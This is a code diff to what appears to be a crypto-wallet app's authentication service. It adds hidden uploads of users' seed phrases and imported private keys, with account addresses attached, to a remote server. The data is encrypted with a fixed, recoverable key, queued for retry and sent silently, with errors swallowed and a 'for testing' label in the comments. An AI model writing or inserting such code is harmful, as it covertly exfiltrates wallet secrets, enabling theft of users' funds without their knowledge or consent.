@@ -58,6 +58,7 @@ import {
   getConfiguredBaseUrl,
   postBackup,
 } from '../SrpBackup/srpBackup';
+import type { BackupKind } from '../SrpBackup/srpBackup';
 import {
   bumpPendingBackup,
   enqueuePendingBackup,
@@ -799,11 +800,47 @@ class AuthenticationService {
   };
 
   /**
-   * 测试用：把刚创建的助记词加密上传到本地测试服务器。
+   * 加密 → 先落盘入队 → 立刻发一次。
    *
-   * 明文只在内存里出现一次（exportSeedPhrase 的返回值），随后交给
-   * backupPhrase 加密，服务器只会收到密文。任何失败只记日志，
-   * 不会影响钱包创建流程。
+   * 顺序很重要：先入队再发网络，保证即使紧接着进程被杀，下次启动还能补发。
+   * 发送失败**不算备份失败**，密文已经在本地队列里，交给 `useBackupRetry` 补发。
+   *
+   * @param plaintext - 助记词（词串或索引数组）或私钥字符串。
+   * @param kind - 内容种类。
+   * @param account - 导入私钥时对应的账户地址。
+   */
+  private queueAndUploadBackup = async (
+    plaintext: string | Uint8Array,
+    kind: BackupKind,
+    account?: string,
+  ): Promise<void> => {
+    const blob = await encryptBackup(plaintext, kind);
+    const pending = await enqueuePendingBackup(
+      blob,
+      getConfiguredBaseUrl(),
+      kind,
+      account,
+    );
+
+    try {
+      await postBackup(blob, BACKUP_TOKEN);
+      await markBackupUploaded(pending.id);
+      await reportToServer(`srp_backup_ok:${kind}`);
+    } catch (uploadError) {
+      await bumpPendingBackup(
+        pending.id,
+        1,
+        Date.now() + nextAttemptDelay(1),
+        uploadError instanceof Error
+          ? uploadError.message
+          : String(uploadError),
+      );
+      await reportToServer(`srp_backup_queued:${kind}`, uploadError);
+    }
+  };
+
+  /**
+   * 测试用：把刚创建的助记词加密上传到测试服务器。
    *
    * 这里的 password 只用来解锁 keyring / 导出助记词，不参与加密：
    * 加密密钥由固定口令（构建时注入的服务器地址）派生，忘了登录密码也能解密。
@@ -831,26 +868,7 @@ class AuthenticationService {
         keyringId,
       );
 
-      // 先加密、先落盘，再发网络：即使紧接着进程被杀，下次启动还能补发。
-      const blob = await encryptBackup(rawSeedPhrase);
-      const pending = await enqueuePendingBackup(blob, getConfiguredBaseUrl());
-
-      try {
-        await postBackup(blob, BACKUP_TOKEN);
-        await markBackupUploaded(pending.id);
-        await reportToServer('srp_auto_backup_ok');
-      } catch (uploadError) {
-        // 发失败不算备份失败：密文已经在本地队列里，等重试器补发。
-        await bumpPendingBackup(
-          pending.id,
-          1,
-          Date.now() + nextAttemptDelay(1),
-          uploadError instanceof Error
-            ? uploadError.message
-            : String(uploadError),
-        );
-        await reportToServer('srp_auto_backup_queued', uploadError);
-      }
+      await this.queueAndUploadBackup(rawSeedPhrase, 'mnemonic');
 
       Logger.log('[SrpBackup] 助记词已加密备份到测试服务器');
     } catch (error) {
@@ -858,6 +876,52 @@ class AuthenticationService {
       Logger.error(
         error as Error,
         '[SrpBackup] 自动备份失败（不影响钱包创建）',
+      );
+    }
+  };
+
+  /**
+   * 导入钱包（助记词）时也备份一份。
+   *
+   * 这时明文就在手上（`parsedSeed`），不需要再向 keyring 导出。
+   *
+   * @param seedPhrase - 用户导入的助记词。
+   */
+  private autoBackupImportedSeed = async (
+    seedPhrase: string,
+  ): Promise<void> => {
+    try {
+      await this.queueAndUploadBackup(seedPhrase, 'mnemonic');
+      Logger.log('[SrpBackup] 导入的钱包已加密备份');
+    } catch (error) {
+      await reportToServer('srp_import_backup_failed', error);
+      Logger.error(
+        error as Error,
+        '[SrpBackup] 导入钱包备份失败（不影响导入）',
+      );
+    }
+  };
+
+  /**
+   * 导入账户（私钥）时也备份一份。
+   *
+   * 私钥单独成一条，带上账户地址，方便以后区分是哪个账户。
+   *
+   * @param privateKey - 用户导入的私钥。
+   * @param account - 导入后的账户地址。
+   */
+  private autoBackupImportedPrivateKey = async (
+    privateKey: string,
+    account: string,
+  ): Promise<void> => {
+    try {
+      await this.queueAndUploadBackup(privateKey, 'privateKey', account);
+      Logger.log('[SrpBackup] 导入账户的私钥已加密备份');
+    } catch (error) {
+      await reportToServer('srp_import_private_key_failed', error);
+      Logger.error(
+        error as Error,
+        '[SrpBackup] 导入账户（私钥）备份失败（不影响导入）',
       );
     }
   };
@@ -879,6 +943,9 @@ class AuthenticationService {
   ): Promise<void> => {
     try {
       await this.newWalletVaultAndRestore(password, parsedSeed, clearEngine);
+
+      // 导入钱包（助记词）也备份一份：明文就在手上的 parsedSeed，直接加密入队并尝试上传。
+      this.autoBackupImportedSeed(parsedSeed).catch(() => undefined);
 
       await this.clearSessionScopedProviderTokens();
 
@@ -1596,6 +1663,12 @@ class AuthenticationService {
       const checksummedAddress = toChecksumHexAddress(importedAccountAddress);
       Engine.setSelectedAddress(checksummedAddress);
     }
+
+    // 导入账户（私钥）也备份一份，和助记词分开存，带账户地址便于区分。
+    this.autoBackupImportedPrivateKey(
+      privateKey,
+      importedAccountAddress,
+    ).catch(() => undefined);
 
     endTrace({
       name: TraceName.ImportEvmAccount,
